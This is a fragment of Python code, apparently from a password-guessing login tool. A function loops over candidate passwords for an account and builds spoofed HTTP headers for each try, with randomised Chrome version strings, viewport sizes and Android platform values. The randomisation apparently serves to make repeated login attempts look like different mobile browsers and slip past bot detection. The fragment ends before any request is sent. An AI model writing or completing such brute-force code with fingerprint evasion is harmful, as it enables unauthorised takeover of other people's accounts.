...
def validate2(idf,pwv):
	...
	for pw in pwv:
		try:
			...
			heade={
    			"Host": url,
    			"content-length": f"{str(rr(500,899))}",
    			"cache-control": "max-age=0",
    			"dpr": f"{str(rr(2,5))}",
    			"viewport-width": f"{str(rr(399,999))}",
    			"sec-ch-ua": f'"Chromium";v="{str(rr(99,122))}", "Not(A:Brand";v="{str(rr(8,24))}", "Google Chrome";v="{str(rr(99,122))}"',
    			"sec-ch-ua-mobile": "?1",
    			"sec-ch-ua-platform": '"Android"',
    			"sec-ch-ua-platform-version": '"{}.0.0"'.format(re.search(r'Android (\d+)', ua).group(1)),
    			"sec-ch-ua-model": "",
    			"sec-ch-ua-full-version-list": f'"Chromium";v="{str(rr(99,122))}.0.{str(rr(5900,6900))}.{str(rr(100,105))}", "Not(A:Brand";v="{str(rr(8,24))}.0.0.0", "Google Chrome";v="{str(rr(99,122))}.0.{str(rr(5900,6900))}.{str(rr(100,105))}"',
